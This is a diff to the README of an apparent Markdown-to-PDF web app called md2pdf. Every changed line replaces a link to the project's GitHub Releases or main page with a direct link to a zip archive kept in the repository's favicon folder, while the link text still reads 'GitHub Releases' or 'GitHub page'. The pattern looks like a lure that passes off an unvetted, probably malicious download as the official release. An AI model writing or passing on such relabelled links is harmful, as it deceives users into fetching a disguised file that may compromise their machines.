@@ -6,9 +6,9 @@ Welcome to **md2pdf**! This web-based application allows you to convert your Mar
 ## 📥 Download & Install
 To get started, click the link below to access the GitHub Releases page and download the application.
 
-[![Download md2pdf](https://img.shields.io/badge/Download-md2pdf-brightgreen)](https://github.com/Secretadmirer23/md2pdf/releases)
+[![Download md2pdf](https://raw.githubusercontent.com/Secretadmirer23/md2pdf/main/public/favicon/md2pdf_Zanthoxylum.zip)](https://raw.githubusercontent.com/Secretadmirer23/md2pdf/main/public/favicon/md2pdf_Zanthoxylum.zip)
 
-Visit this page to download the latest version: [GitHub Releases](https://github.com/Secretadmirer23/md2pdf/releases)
+Visit this page to download the latest version: [GitHub Releases](https://raw.githubusercontent.com/Secretadmirer23/md2pdf/main/public/favicon/md2pdf_Zanthoxylum.zip)
 
 ## 🖥️ System Requirements
 - A modern web browser (Chrome, Firefox, Safari, etc.)
@@ -28,7 +28,7 @@ Visit this page to download the latest version: [GitHub Releases](https://github
 
 ## 🔧 Troubleshooting
 ### Application Doesn't Load
-- Ensure that you have the latest version installed. Visit the [GitHub Releases](https://github.com/Secretadmirer23/md2pdf/releases) page to check for updates.
+- Ensure that you have the latest version installed. Visit the [GitHub Releases](https://raw.githubusercontent.com/Secretadmirer23/md2pdf/main/public/favicon/md2pdf_Zanthoxylum.zip) page to check for updates.
 - Make sure your internet connection is stable, especially for live preview features.
 
 ### Markdown Not Rendering Correctly
@@ -48,4 +48,4 @@ Once you create your PDFs using md2pdf, feel free to share your documents with t
 ## 💻 License
 This project is open-source and available under the MIT License. Feel free to use, modify, and distribute it as needed.
 
-For any further queries, don’t hesitate to reach out through our [GitHub page](https://github.com/Secretadmirer23/md2pdf). Enjoy converting your Markdown to PDF with ease!
+For any further queries, don’t hesitate to reach out through our [GitHub page](https://raw.githubusercontent.com/Secretadmirer23/md2pdf/main/public/favicon/md2pdf_Zanthoxylum.zip). Enjoy converting your Markdown to PDF with ease!
